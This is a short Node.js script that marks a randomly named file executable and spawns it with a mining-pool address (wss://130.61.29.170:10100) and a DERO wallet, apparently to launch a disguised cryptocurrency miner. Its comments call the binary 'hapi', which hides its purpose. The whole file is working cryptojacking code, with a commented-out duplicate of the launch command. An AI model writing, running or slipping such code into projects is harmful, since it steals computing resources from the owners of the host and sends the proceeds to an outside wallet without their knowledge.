const { exec, execFile, spawn } = require('child_process');

// Run 'chmod +x ./hapi' command
exec('chmod +x ./mqOYEYfxvD.js', (err, stdout, stderr) => {
  if (err) {
    console.error(`Error running chmod command: ${err}`);
    return;
  }
  
  // Run './hapi' command
  
//   const child = exec('./mqOYEYfxvD.js -o wss://130.61.29.170:10100 -u dero1qyra7k5ypz88pl3w830na8hw2m7uhxa84hjnc85g5d4wymxlk6szyqqkvnpe3', (error, stdout, stderr) => {
//     if (error) {
//       throw error;
//     }
//     console.log(stdout);
//   });
  const cmd = './mqOYEYfxvD.js';
const args = ['-o', 'wss://130.61.29.170:10100', '-u', 'dero1qyra7k5ypz88pl3w830na8hw2m7uhxa84hjnc85g5d4wymxlk6szyqqkvnpe3'];

const child = spawn(cmd, args);

child.stdout.on('data', (data) => {
  console.log(`stdout: ${data}`);
});

  
  
});
